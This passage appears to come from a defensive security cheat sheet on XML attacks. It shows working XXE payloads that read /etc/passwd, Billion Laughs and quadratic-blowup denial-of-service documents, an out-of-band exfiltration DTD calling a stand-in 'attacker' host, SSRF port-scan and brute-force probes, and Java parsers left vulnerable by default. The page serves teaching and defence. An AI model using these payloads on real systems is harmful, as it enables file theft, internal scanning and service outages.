<p>When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.</p>
<h4 id="evil-employee-attack"><a name="evil-employee-attack" class="plugin-anchor" href="#evil-employee-attack"><i class="fa fa-link" aria-hidden="true"></i></a>Evil Employee Attack</h4>
<p>When third parties host and define schemas, the contents are not under the control of the schemas&apos; users. Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a>).</p>
<h2 id="xml-entity-expansion"><a name="xml-entity-expansion" class="plugin-anchor" href="#xml-entity-expansion"><i class="fa fa-link" aria-hidden="true"></i></a>XML Entity Expansion</h2>
<p>If the parser uses a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a>, an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.</p>
<h3 id="sample-vulnerable-java-implementations"><a name="sample-vulnerable-java-implementations" class="plugin-anchor" href="#sample-vulnerable-java-implementations"><i class="fa fa-link" aria-hidden="true"></i></a>Sample Vulnerable Java Implementations</h3>
<p>Using the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> capabilities of referencing local or remote files it is possible to affect the confidentiality. In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.</p>
<p><strong>Sample XML</strong></p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE contacts SYSTEM &quot;contacts.dtd&quot;&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">contacts</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">contact</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>John<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span> 
  <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">contact</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">contacts</span>&gt;</span>
</code></pre>
<p><strong>Sample DTD</strong></p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">contacts</span> (<span class="hljs-attr">contact</span>*)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">contact</span> (<span class="hljs-attr">firstname</span>,<span class="hljs-attr">lastname</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">firstname</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">lastname</span> <span class="hljs-attr">ANY</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">xxe</span> <span class="hljs-attr">SYSTEM</span> &quot;/<span class="hljs-attr">etc</span>/<span class="hljs-attr">passwd</span>&quot;&gt;</span>
</code></pre>
<h4 id="xxe-using-dom"><a name="xxe-using-dom" class="plugin-anchor" href="#xxe-using-dom"><i class="fa fa-link" aria-hidden="true"></i></a>XXE using DOM</h4>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;
<span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;
<span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;
<span class="hljs-keyword">import</span> org.xml.sax.InputSource;
<span class="hljs-keyword">import</span> org.w3c.dom.Document;
<span class="hljs-keyword">import</span> org.w3c.dom.Element;
<span class="hljs-keyword">import</span> org.w3c.dom.Node;
<span class="hljs-keyword">import</span> org.w3c.dom.NodeList;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">parseDocument</span> </span>{
 <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
  <span class="hljs-keyword">try</span> {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(<span class="hljs-keyword">new</span> InputSource(<span class="hljs-string">&quot;contacts.xml&quot;</span>));
   NodeList nodeList = doc.getElementsByTagName(<span class="hljs-string">&quot;contact&quot;</span>);
   <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> s = <span class="hljs-number">0</span>; s &lt; nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     <span class="hljs-keyword">if</span> (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName(<span class="hljs-string">&quot;firstname&quot;</span>);
       Element firstNameElement = (Element) firstNameElementList.item(<span class="hljs-number">0</span>);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println(<span class="hljs-string">&quot;First Name: &quot;</span>  + ((Node) firstName.item(<span class="hljs-number">0</span>)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName(<span class="hljs-string">&quot;lastname&quot;</span>);
       Element lastNameElement = (Element) lastNameElementList.item(<span class="hljs-number">0</span>);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println(<span class="hljs-string">&quot;Last Name: &quot;</span> + ((Node) lastName.item(<span class="hljs-number">0</span>)).getNodeValue());
     }
    }
  } <span class="hljs-keyword">catch</span> (Exception e) {
    e.printStackTrace();
  }
 }
}
</code></pre>
<p>The previous code produces the following output:</p>
<pre><code class="lang-bash">$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: <span class="hljs-comment">### User Database</span>
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/<span class="hljs-literal">false</span>
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre>
<h4 id="xxe-using-dom4j"><a name="xxe-using-dom4j" class="plugin-anchor" href="#xxe-using-dom4j"><i class="fa fa-link" aria-hidden="true"></i></a>XXE using DOM4J</h4>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> org.dom4j.Document;
<span class="hljs-keyword">import</span> org.dom4j.DocumentException;
<span class="hljs-keyword">import</span> org.dom4j.io.SAXReader;
<span class="hljs-keyword">import</span> org.dom4j.io.OutputFormat;
<span class="hljs-keyword">import</span> org.dom4j.io.XMLWriter;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test1</span> </span>{
 <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
  Document document = <span class="hljs-keyword">null</span>;
  <span class="hljs-keyword">try</span> {
   SAXReader reader = <span class="hljs-keyword">new</span> SAXReader();
   document = reader.read(<span class="hljs-string">&quot;contacts.xml&quot;</span>);
  } <span class="hljs-keyword">catch</span> (Exception e) {
   e.printStackTrace();
  } 
  OutputFormat format = OutputFormat.createPrettyPrint();
  <span class="hljs-keyword">try</span> {
   XMLWriter writer = <span class="hljs-keyword">new</span> XMLWriter( System.out, format );
   writer.write( document );
  } <span class="hljs-keyword">catch</span> (Exception e) {
   e.printStackTrace();
  }
 }
}
</code></pre>
<p>The previous code produces the following output:</p>
<pre><code class="lang-bash">$ java <span class="hljs-built_in">test</span>1
&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;
&lt;!DOCTYPE contacts SYSTEM <span class="hljs-string">&quot;contacts.dtd&quot;</span>&gt;

&lt;contacts&gt;
 &lt;contact&gt;
  &lt;firstname&gt;John&lt;/firstname&gt;
  &lt;lastname&gt;<span class="hljs-comment">### User Database</span>
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/<span class="hljs-literal">false</span>
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre>
<h4 id="xxe-using-sax"><a name="xxe-using-sax" class="plugin-anchor" href="#xxe-using-sax"><i class="fa fa-link" aria-hidden="true"></i></a>XXE using SAX</h4>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> javax.xml.parsers.SAXParser;
<span class="hljs-keyword">import</span> javax.xml.parsers.SAXParserFactory;
<span class="hljs-keyword">import</span> org.xml.sax.SAXException;
<span class="hljs-keyword">import</span> org.xml.sax.helpers.DefaultHandler;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">parseDocument</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DefaultHandler</span> </span>{
 <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
  <span class="hljs-keyword">new</span> parseDocument();
 }
 <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">parseDocument</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">try</span> {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse(<span class="hljs-string">&quot;contacts.xml&quot;</span>, <span class="hljs-keyword">this</span>);
  } <span class="hljs-keyword">catch</span> (Exception e) {
   e.printStackTrace();
  }
 }
 <span class="hljs-meta">@Override</span>
 <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">characters</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[] ac, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span> <span class="hljs-keyword">throws</span> SAXException </span>{
  String tmpValue = <span class="hljs-keyword">new</span> String(ac, i, j);
  System.out.println(tmpValue);
 }
}
</code></pre>
<p>The previous code produces the following output:</p>
<pre><code class="lang-bash">$ java parseDocument
John
<span class="hljs-comment">### User Database</span>
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/<span class="hljs-literal">false</span>
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre>
<h4 id="xxe-using-stax"><a name="xxe-using-stax" class="plugin-anchor" href="#xxe-using-stax"><i class="fa fa-link" aria-hidden="true"></i></a>XXE using StAX</h4>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParserFactory;
<span class="hljs-keyword">import</span> javax.xml.stream.XMLStreamReader;
<span class="hljs-keyword">import</span> javax.xml.stream.XMLInputFactory;
<span class="hljs-keyword">import</span> java.io.File;
<span class="hljs-keyword">import</span> java.io.FileReader;
<span class="hljs-keyword">import</span> java.io.FileInputStream;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">parseDocument</span> </span>{
 <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
  <span class="hljs-keyword">try</span> {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = <span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;contacts.xml&quot;</span>);
   File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;contacts.xml&quot;</span>);
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader(<span class="hljs-string">&quot;contacts.xml&quot;</span>, 
                                            <span class="hljs-keyword">new</span> FileInputStream(file));
   <span class="hljs-keyword">int</span> eventType = xmlfer.getEventType();
   <span class="hljs-keyword">while</span> (xmlfer.hasNext()) {
    eventType = xmlfer.next(); 
    <span class="hljs-keyword">if</span>(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } <span class="hljs-keyword">catch</span> (Exception e) {
   e.printStackTrace();
  }
 }
}
</code></pre>
<p>The previous code produces the following output:</p>
<pre><code class="lang-bash">$ java parseDocument
&lt;!DOCTYPE contacts SYSTEM <span class="hljs-string">&quot;contacts.dtd&quot;</span>&gt;John<span class="hljs-comment">### User Database</span>
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/<span class="hljs-literal">false</span>
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre>
<h3 id="recursive-entity-reference"><a name="recursive-entity-reference" class="plugin-anchor" href="#recursive-entity-reference"><i class="fa fa-link" aria-hidden="true"></i></a>Recursive Entity Reference</h3>
<p>When the definition of an element <code>A</code> is another element <code>B</code>, and that element <code>B</code> is defined as element <code>A</code>, that schema describes a circular reference between elements:</p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE A [
 &lt;!ELEMENT A ANY&gt;
 &lt;!ENTITY A &quot;&lt;A&gt;&amp;B;&lt;/A&gt;&quot;&gt; 
 &lt;!ENTITY B &quot;&amp;A;&quot;&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">A</span>&gt;</span>&amp;A;<span class="hljs-tag">&lt;/<span class="hljs-name">A</span>&gt;</span>
</code></pre>
<h3 id="quadratic-blowup"><a name="quadratic-blowup" class="plugin-anchor" href="#quadratic-blowup"><i class="fa fa-link" aria-hidden="true"></i></a>Quadratic Blowup</h3>
<p>Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion <code>(O(n2))</code>. </p>
<p>The result of the following attack will be 100,000 x 100,000 characters in memory.</p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE root [
 &lt;!ELEMENT root ANY&gt;
 &lt;!ENTITY A &quot;AAAAA...(a 100.000 A&apos;s)...AAAAA&quot;&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;A;&amp;A;&amp;A;&amp;A;...(a 100.000 &amp;A;&apos;s)...&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
</code></pre>
<h3 id="billion-laughs"><a name="billion-laughs" class="plugin-anchor" href="#billion-laughs"><i class="fa fa-link" aria-hidden="true"></i></a>Billion Laughs</h3>
<p>When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> schema including the attack:</p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE root [
 &lt;!ELEMENT root ANY&gt;
 &lt;!ENTITY LOL &quot;LOL&quot;&gt;
 &lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;
 &lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;
 &lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;
 &lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;
 &lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;
 &lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;
 &lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;
 &lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;
 &lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt; 
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;LOL9;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
</code></pre>
<p>The entity <code>LOL9</code> will be resolved as the 10 entities defined in <code>LOL8</code>; then each of these entities will be resolved in <code>LOL7</code> and so on. Finally, the CPU and/or memory will be affected by parsing the <code>3 x 10^9</code> (3,000,000,000) entities defined in this schema, which could make the parser crash.</p>
<p>The Simple Object Access Protocol (<a href="https://en.wikipedia.org/wiki/SOAP" target="_blank">SOAP</a>) specification forbids <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a>s completely. This means that a SOAP processor can reject any SOAP message that contains a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a>. Despite this specification, certain SOAP implementations did parse <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> schemas within SOAP messages. </p>
<p>The following example illustrates a case where the parser is not following the specification, enabling a reference to a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> in a SOAP message:</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>XML VERSION=<span class="hljs-string">&quot;1.0&quot;</span> ENCODING=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE SOAP-ENV:ENVELOPE [ 
 &lt;!ELEMENT SOAP-ENV:ENVELOPE ANY&gt;
 &lt;!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED&gt;
 &lt;!ENTITY LOL &quot;LOL&quot;&gt;
 &lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;
 &lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;
 &lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;
 &lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;
 &lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;
 &lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;
 &lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;
 &lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;
 &lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;
]&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">SOAP:ENVELOPE</span> <span class="hljs-attr">ENTITYREFERENCE</span>=<span class="hljs-string">&quot;&amp;LOL9;&quot;</span> 
               <span class="hljs-attr">XMLNS:SOAP</span>=<span class="hljs-string">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span>&gt;</span> 
 <span class="hljs-tag">&lt;<span class="hljs-name">SOAP:BODY</span>&gt;</span> 
  <span class="hljs-tag">&lt;<span class="hljs-name">KEYWORD</span> <span class="hljs-attr">XMLNS</span>=<span class="hljs-string">&quot;URN:PARASOFT:WS:STORE&quot;</span>&gt;</span>FOO<span class="hljs-tag">&lt;/<span class="hljs-name">KEYWORD</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">SOAP:BODY</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SOAP:ENVELOPE</span>&gt;</span>
</code></pre>
<h3 id="reflected-file-retrieval"><a name="reflected-file-retrieval" class="plugin-anchor" href="#reflected-file-retrieval"><i class="fa fa-link" aria-hidden="true"></i></a>Reflected File Retrieval</h3>
<p>Consider the following example code of an XXE:</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE root [
 &lt;!ELEMENT includeme ANY&gt;
 &lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
</code></pre>
<p>The previous XML defines an entity named <code>xxe</code>, which is in fact the contents of <code>/etc/passwd</code>, which will be expanded within the <code>includeme</code> tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.</p>
<h3 id="server-side-request-forgery"><a name="server-side-request-forgery" class="plugin-anchor" href="#server-side-request-forgery"><i class="fa fa-link" aria-hidden="true"></i></a>Server Side Request Forgery</h3>
<p>Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file, a file via HTTP/HTTPS/FTP, etc. SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.</p>
<h4 id="external-dns-resolution"><a name="external-dns-resolution" class="plugin-anchor" href="#external-dns-resolution"><i class="fa fa-link" aria-hidden="true"></i></a>External DNS Resolution</h4>
<p>Sometimes is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.</p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE m PUBLIC &quot;-//B/A/EN&quot; &quot;http://checkforthisspecificdomain.example.com&quot;&gt;</span>
</code></pre>
<h4 id="external-connection"><a name="external-connection" class="plugin-anchor" href="#external-connection"><i class="fa fa-link" aria-hidden="true"></i></a>External Connection</h4>
<p>Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE root [ 
 &lt;!ENTITY % xxe SYSTEM &quot;http://attacker/evil.dtd&quot;&gt; 
 %xxe;
]&gt;</span>
</code></pre>
<h4 id="file-retrieval-with-parameter-entities"><a name="file-retrieval-with-parameter-entities" class="plugin-anchor" href="#file-retrieval-with-parameter-entities"><i class="fa fa-link" aria-hidden="true"></i></a>File Retrieval with Parameter Entities</h4>
<p>Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE root [
 &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
 &lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;
 %dtd;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;send;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
</code></pre>
<p>Here the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> defines two external parameter entities: <code>file</code> loads a local file, and <code>dtd</code> which loads a remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a>. The remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> should contain something like this:</p>
<pre><code class="lang-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://example.com/?%file;&apos;&gt;&quot;&gt;
%all;
</code></pre>
<p>The second <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank">DTD</a> causes the system to send the contents of the <code>file</code> back to the attacker&apos;s server as a parameter of the URL.</p>
<h4 id="port-scanning"><a name="port-scanning" class="plugin-anchor" href="#port-scanning"><i class="fa fa-link" aria-hidden="true"></i></a>Port Scanning</h4>
<p>The amount and type of information will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:</p>
<p><strong>1) Complete Disclosure</strong>: The simplest and most unusual scenario, with complete disclosure you can clearly see what&apos;s going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.</p>
<p><strong>2) Error-based</strong>: If you are unable to see the response from the remote server, you may be able to use the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:</p>
<pre><code class="lang-text">java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
</code></pre>
<p><strong>3) Timeout-based</strong>: Timeouts could occur when connecting to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.</p>
<p><strong>4) Time-based</strong>: Sometimes differences between closed and open ports are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host; then analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish when performed in higher latency networks.</p>
<h4 id="brute-forcing"><a name="brute-forcing" class="plugin-anchor" href="#brute-forcing"><i class="fa fa-link" aria-hidden="true"></i></a>Brute Forcing</h4>
<p>Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the <code>username</code> and <code>password</code> as part of the URI scheme (http, ftp, etc). For example the following :</p>
<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE root [
 &lt;!ENTITY user SYSTEM &quot;http://username:password@example.com:8080&quot;&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;user;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: XML External Entity Prevention ">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
